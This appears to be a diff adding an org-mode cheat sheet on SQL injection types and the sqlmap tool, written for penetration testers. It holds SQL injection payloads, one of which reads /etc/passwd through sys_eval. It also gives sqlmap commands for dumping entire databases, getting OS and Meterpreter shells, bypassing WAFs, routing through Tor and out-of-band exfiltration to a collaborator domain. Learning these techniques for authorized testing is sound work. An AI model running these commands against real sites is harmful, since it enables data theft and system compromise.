@@ -1,0 +1,326 @@
+#+TITLE: HACKING TOOLS
+#+DESCRIPTION: SQLMAP Tool 
+#+AUTHOR: Linux-DEX
+#+OPTIONS: toc:3
+
+* TABLE OF CONTENT :toc:
+- [[#introduction][Introduction]]
+- [[#sql-injection-types][SQL Injection Types]]
+  - [[#error-based-injection][Error Based Injection]]
+  - [[#time-delay][Time Delay]]
+  - [[#stacked-queries][Stacked Queries]]
+  - [[#boolean-based-injection][Boolean Based Injection]]
+  - [[#union-based][Union Based]]
+  - [[#command-injection][Command Injection]]
+- [[#sqlmap-tool][sqlmap tool]]
+  - [[#options][Options:]]
+  - [[#target][Target:]]
+  - [[#request][Request:]]
+  - [[#injection][Injection:]]
+  - [[#detection][Detection:]]
+  - [[#techniques][Techniques:]]
+  - [[#enumeration][Enumeration:]]
+  - [[#operating-system-access][Operating system access:]]
+  - [[#general][General:]]
+  - [[#miscellaneous][Miscellaneous:]]
+- [[#commands][Commands]]
+  - [[#basic-sqlmap-command][Basic SQLMAP command]]
+  - [[#enumerate-database][Enumerate Database]]
+  - [[#enumerate-tables][Enumerate Tables]]
+  - [[#list-the-column-in-table][List the column in table]]
+  - [[#to-dump-an-entire-database][To dump an entire database]]
+  - [[#sqlmap-from-burp-file][sqlmap from burp file]]
+  - [[#custom-sql-injection-payload-pre-and-post-input][Custom SQL injection Payload: pre and post input]]
+  - [[#sqlmap-cookie][SQLMap cookie]]
+  - [[#sqlmap-shell][SQLMap Shell]]
+  - [[#sqlmap-waf-bypass][SQLMap WAF Bypass]]
+  - [[#sqlmap-proxy][SQLMap Proxy]]
+  - [[#sqlmap-blind-sqli-of-bandoob][SQLMap Blind sqli of band(OOB)]]
+  - [[#sqlmap-get-parameter][SQLMap GET Parameter]]
+  - [[#sqlmap-post-parameter][SQLMap POST Parameter]]
+  - [[#run-sql-queries][Run SQL Queries]]
+  - [[#url-parameters-in-friendly-urls][URL Parameters in Friendly URL's]]
+  - [[#sqlmap-crawl--exploit][SQLMap Crawl & Exploit]]
+
+* Introduction
++ SQLmap is an open-source penetration testing tool designed to automate the detection and exploitation of SQL injection vulnerabilities in web applications.
++ SQLmap includes a robust detection engine and numerous features for penetration testers, allowing them to fingerprint databases, retrieve data, access the file system, and execute commands on the operating system.
++ It detects SQL injections on target hosts and offers options such as database fingerprinting, user enumeration, password retrieval, table/column dumping, executing custom SQL statements, and reading files on the file system.
++ Overall, SQLmap simplifies the process of identifying and exploiting SQL injection flaws in web applications.
+
+* SQL Injection Types
+** Error Based Injection
++ Error Based Injection technique forces the database to generate an error, giving the attacker or tester information upon which to refine their injection.
++ This method only works when the webapp doesn't handle error properly and shows it on the screen to the user.
++ *Example:*
+    #+begin_example
+    ' || cast('-' || current_database() as numeric) || '
+    #+end_example
+    - Here we try to cast string as numeric, which of course will throw an error but the evaluated string with current database name will part of the error message. Thus giving hacker info about database.
+
+** Time Delay
++ This method is a type of '=Blind Query='. Blind query is opposite of error based injection, where user doesn't see the information/errors of the database to the front end.
++ This query is specially useful when knowing if the application is injectable or not.
++ In this injection type, we use database commands (e.g. sleep) to delay answers in conditional queries.
++ *Example:*
+
+    #+begin_example
+    SELECT IF(version()=5.3, sleep(5), 'false')
+    #+end_example
+
++ As shown in the example above, an attacker can send a bunch of true-false statements with sleep function running on true or false case to gain information.
++ Attacker has to keep trying continuously with new values in this technique. This is why automation tools like SQLMAP are very useful in this case.
+
+** Stacked Queries 
++ This is one of the easiest yet one of the most powerful injection technique.
++ Stacked queries(also known as batch queries) is an ability to modify data and call stored procedures by terminating the original query and adding a new one.
++ *Example:*
+
+    #+begin_example
+    '; select pg_sleep(3) --
+    #+end_example
+
++ This is very powerful since an attacker is not restricted by previous queries rows and conditions.
+   
+** Boolean Based Injection 
++ Boolean based injection is also a type of blind injection.
++ In this method, an attacker uses Boolean condition(s) to verify whether certain conditions are true or false.
++ *Example:*
+
+#+begin_example
+1. ' or (username='perl' and length(passwd)=N) --
+2. ' or (username='perl' and ASCII(substring(passwd,1,1))=112) --
+#+end_example
+
++ In this example, we are trying to get password for the user 'perl'. First, we try to guess the length of the password for the user. We keep trying until it's corrent, at which point, we will be able to get into the application.
++ Once we find out the password length, we again try to go through each substring of size 1 and try to match it with a character. Again this is tedious procedure, which is why we use tools like SQLMAP.
+
+** Union Based
++ Union based injection can be used when the SQL injection flaw happens in SELECT statement, making it possible to combine two queries into a single result or result set.
++ *Example:*
+
+#+begin_example
+select id, firstname, lastname from ...
+union 
+        (select id, 
+                (select 'Current Schema: ' ||  current_schema() ||  
+                ' Current Database:  '  || current_database()  
+                ' Current DB User: ' || current_user() ), 
+                , lastname 
+        from 
+                account) --
+#+end_example
+
++ Here, if we know that the select statement takes 3 queries (Easy to find out if errors are enabled) and it echoes the value of one of the field to the user, we can take advantage of that and use select statements to get more information out of database.
+
+** Command Injection
++ Modern day databases have a way for db users to define their own functions, which is called UDF(User Defined Functions). 
++ If the users have functions like sys_eval (which is commong amongst libraries) and if the app is injectable, attackers can gain access to the shell.
++ *Example:*
+
+#+begin_example
+select id, firstname, lastname from ... UNION (select '1', (select sys_eval('cat /etc/passwd')), '1' from account)--
+#+end_example
+
++ This is an example of code injection leading to command injection.
+
+* sqlmap tool
+** Options:
+
++  -h, --help            Show basic help message and exit
++  -hh                   Show advanced help message and exit
++  --version             Show program's version number and exit
++  -v VERBOSE            Verbosity level: 0-6 (default 1)
+
+** Target:
+At least one of these options has to be provided to define the
+target(s)
+
++  -u URL, --url=URL   Target URL (e.g. "http://www.site.com/vuln.php?id=1")
++  -g GOOGLEDORK       Process Google dork results as target URLs
+
+** Request:
+These options can be used to specify how to connect to the target URL
+
++ --data=DATA         Data string to be sent through POST (e.g. "id=1")
++ --cookie=COOKIE     HTTP Cookie header value (e.g. "PHPSESSID=a8d127e..")
++ --random-agent      Use randomly selected HTTP User-Agent header value
++ --proxy=PROXY       Use a proxy to connect to the target URL
++ --tor               Use Tor anonymity network
++ --check-tor         Check to see if Tor is used properly
+
+** Injection:
+These options can be used to specify which parameters to test for,
+provide custom injection payloads and optional tampering scripts
+
++ -p TESTPARAMETER    Testable parameter(s)
++ --dbms=DBMS         Force back-end DBMS to provided value
+
+** Detection:
+These options can be used to customize the detection phase
+
++ --level=LEVEL       Level of tests to perform (1-5, default 1)
++ --risk=RISK         Risk of tests to perform (1-3, default 1)
+
+** Techniques:
+These options can be used to tweak testing of specific SQL injection
+techniques
+
++ --technique=TECH..  SQL injection techniques to use (default "BEUSTQ")
+
+** Enumeration:
+These options can be used to enumerate the back-end database
+management system information, structure and data contained in the
+tables
+
++ -a, --all           Retrieve everything
++ -b, --banner        Retrieve DBMS banner
++ --current-user      Retrieve DBMS current user
++ --current-db        Retrieve DBMS current database
++ --passwords         Enumerate DBMS users password hashes
++ --dbs               Enumerate DBMS databases
++ --tables            Enumerate DBMS database tables
++ --columns           Enumerate DBMS database table columns
++ --schema            Enumerate DBMS schema
++ --dump              Dump DBMS database table entries
++ --dump-all          Dump all DBMS databases tables entries
++ -D DB               DBMS database to enumerate
++ -T TBL              DBMS database table(s) to enumerate
++ -C COL              DBMS database table column(s) to enumerate
+
+** Operating system access:
+These options can be used to access the back-end database management
+system underlying operating system
+
++ --os-shell          Prompt for an interactive operating system shell
++ --os-pwn            Prompt for an OOB shell, Meterpreter or VNC
+  
+** General:
+These options can be used to set some general working parameters
+
++ --batch             Never ask for user input, use the default behavior
++ --flush-session     Flush session files for current target
+  
+** Miscellaneous:
+These options do not fit into any other category
+
++ --wizard            Simple wizard interface for beginner users
+
+* Commands
+** Basic SQLMAP command
+#+begin_example
+$ sqlmap -u [URL] -p [parameter] --dbs
+#+end_example
++ This command will tell sqlmap to scan the specified URL and parameter for vulnerabilities.
+
+** Enumerate Database
+#+begin_example
+$ sqlmap -u http://testsite.com/page.php?id=1 --dbs
+#+end_example
++ The =-u= flag is used to specify an URL and the =--dbs= command tells SQLMap to try to enumerate the database.
+
+** Enumerate Tables
++ Once we have gained an initial foothold, we can now work with the database. list the tables in a database
+#+begin_example
+$ sqlmap -u https://testsite.com/page.php?id=1 -D <db_name> --tables
+#+end_example
+
+** List the column in table
+#+begin_example
+$ sqlmap -u https://testsite.com/page.php?id=7 -D <database_name> -T <table_name> --columns
+#+end_example
+
+** To dump an entire database
+#+begin_example
+$ sqlmap -u https://testsite.com/page.php?id=7 -D <database_name> --dump-all
+#+end_example
+
+** sqlmap from burp file
++ Save a burp or zap request file and mark the injection point parameters with an asterisk(*), the good thing about this option is that it takes care of any authentication cookies for you. 
++ You can inject into any parameter in the request e.g., headers, inside cookies, and using multiple method(GET, PUT, POST, DELETE) etc...
+#+begin_example
+$ sqlmap -r request.burp
+#+end_example
+
+** Custom SQL injection Payload: pre and post input
+
+*** How to insert input before an injection payload
+#+begin_example
+$ sqlmap -u "https://highon.coffee" -dbs --suffix="blah"
+#+end_example
+
+*** How to insert input after an injection payload
+#+begin_example
+$ sqlmap -u "https://highon.coffee" -dbs --postfix="--+"  
+#+end_example
+
+** SQLMap cookie
+#+begin_example
+$ --cookie="PHPSESSID=$your-cookie"
+#+end_example
+
+** SQLMap Shell
+*** How to get an operating system command shell with sqlmap
+#+begin_example
+$ --os-shell
+#+end_example
+
+*** How to execute a command with sqlmap
+#+begin_example
+$ --os-cmd uname
+#+end_example
+
+*** Meterpreter shell with SQLmap
+#+begin_example
+$ --os-pwn
+#+end_example
+
+** SQLMap WAF Bypass
++ To bypass WAF's with SQLMap you can use the premade tamper scripts with =--tamper= like in the following example:
+#+begin_example
+$ sqlmap -u “https://highon.coffee/?espresso=*” --tamper="apostrophemask,apostrophenullencode,randomcase"
+#+end_example
+
+** SQLMap Proxy
++ It is possible to proxy sqlmap traffic via an upstream proxy such as burp suite by passing.
+#+begin_example
+$ sqlmap --proxy=http://127.0.0.1:8080
+#+end_example
+
+** SQLMap Blind sqli of band(OOB)
+#+begin_example
+$ sqlmap -u “https://highon.coffee/?espresso=*” --dns-domain=$your-collab-url
+#+end_example
+
+** SQLMap GET Parameter
++ The following specifies the GET parameter "espresso" for injection:
+#+begin_example
+$ sqlmap -u “https://highon.coffee/?espresso=*” -p espresso 
+#+end_example
+
+** SQLMap POST Parameter
++ The following specifices the POST parameter "espresso" for injection:
+#+begin_example
+$ sqlmap -u “https://highon.coffee/?espresso=*” --data “espresso=*” 
+#+end_example
+
+** Run SQL Queries
++ You can run a sql query using -sql-query for example:
+#+begin_example
+$ sqlmap -u highon.coffee -D $database-name --sql-query="SELECT * FROM $table;"
+#+end_example
+
+** URL Parameters in Friendly URL's 
+Simply mark them with a asterisk(*), for example:
+#+begin_example
+$ https://highon.coffee/foo/bar/parameter1*/value1 
+#+end_example
+The above would set the injection point at parameter1.
+
+** SQLMap Crawl & Exploit
++ Useful for automation, however please be mindful of the overheads you are imposing on the target server:
+#+begin_example
+$ python3 sqlmap.py --crawl=5 --threads=5 --risk=3 --level=5 --batch --answers="keep testing=Y,sitemap=Y,skip further tests=N" --crawl-exclude="logout" --forms --tamper=apostrophemask,apostrophenullencode,randomcase --dns-domain=$your-collab-url --random-agent -u https://highon.coffee
+#+end_example
+
++ You will need to replace your collaborator payloads URL, and I higly recommend you setup your own collaborator server for this.
